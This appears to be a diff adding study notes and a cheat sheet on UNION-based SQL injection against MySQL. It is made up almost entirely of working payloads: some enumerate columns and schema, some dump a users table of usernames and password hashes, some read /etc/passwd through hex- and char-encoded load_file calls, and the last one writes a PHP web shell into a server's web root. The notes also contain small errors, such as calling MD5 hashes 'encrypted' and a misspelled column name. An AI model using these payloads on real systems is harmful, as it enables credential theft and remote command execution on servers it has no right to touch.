@@ -1,1 +1,84 @@
+The UNION keyword aids exploitation because it enables execution of an extra SELECT statement and provides the results in the same query, thus concatenating two queries into one statement.
+For UNION SQLi attacks to work, we first need to satisfy two conditions:
 
+    The injected UNION query has to include the same number of columns as the original query.
+    The data types need to be compatible between each column.
+    
+Enumerating number of columns:
+To discover the correct number of columns, we can submit the following injected query into the search bar:
+
+' ORDER BY 1-- //
+Verifying the exact number of columns
+
+The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist. 
+Increasing the column value by one each time, we'll discover that the table has five columns, since ordering by column six returns an error.
+Figure 10: Finding the Exact Number of Columns    
+
+With this information in mind, we can attempt our first attack by enumerating the current database name, user, and MySQL version.
+
+%' UNION SELECT database(), user(), @@version, null, null -- //
+
+Enumerating the Database via SQL UNION Injection
+    
+After launching our attack, we'll notice that the username and the DB version are present on the last line, but the current database name is not. 
+This happens because column is typically reserved for the ID field consisting of an integer data type, meaning it cannot return the string value we are requesting through the SELECT database() statement.
+
+The web application is explicitly omitting the output from the first column because IDs are not usually useful information for end users.
+With this in mind, let's update our query by shifting all the enumerating functions to the right-most place, avoiding any type mismatches.
+
+%' UNION SELECT database(), user(), @@version, null, null -- //
+
+' UNION SELECT null, null, database(), user(), @@version  -- //
+Fixing the Injected UNION Query    
+    
+Let's extend our tradecraft and verify whether other tables are present in the current database. 
+
+We can start by enumerating the information schema of the current database from the information_schema.columns table.
+We'll attempt to retrieve the columns table from the information_schema database belonging to the current database. 
+We'll then store the output in the second, third, and fourth columns, leaving the first and fifth columns null.
+
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+ Retrieving Current Database Tables and Columns    
+    
+This output verifies that the three columns contain the table name, the column name, and the current database, respectively.
+Interestingly, we discovered a new table named users that contains four columns, including one named password.
+Let's craft a new query to dump the users table.
+
+' UNION SELECT null, username, password, description, null FROM users -- //
+Retrieving Current Database Tables and Columns    
+    
+Our UNION-based payload was able to fetch the usernames and MD5 hashes of the entire users table, including an administrative account. 
+These MD5 values are encrypted versions of the plain-text passwords, which can be reversed using appropriate tools.    
+
+
+
+
+Union-Based SQL
+order by 1
+' UNION SELECT 1,2,3 -- -	
+' UNION SELECT 1,@@version,3 -- -
+' UNION SELECT 1,user(),3 -- -	
+' UNION SELECT 1,load_file('/etc/passwd'),3 -- -	
+' UNION SELECT 1,load_file(0x2f6574632f706173737764),3 -- -	    //hex encode
+
+' UNION SELECT 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100))
+,3 -- -	         // char encode
+
+// List databases available
+' UNION SELECT 1,2,3,4,5,group_concat(table_schema) from information_schema.tables -- -
+
+// Fetch Table names
+' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- -
+union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+
+// Fetch Column names from Table
+' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='users' -- -	
+union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+
+// Dump data from Columns using 0x3a as seperator
+' UNION SELECT 1,group_concat(user,0x3a,pasword),3 from users limit 0,1-- -
+
+PhP Backdoor
+// Backdoor
+
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
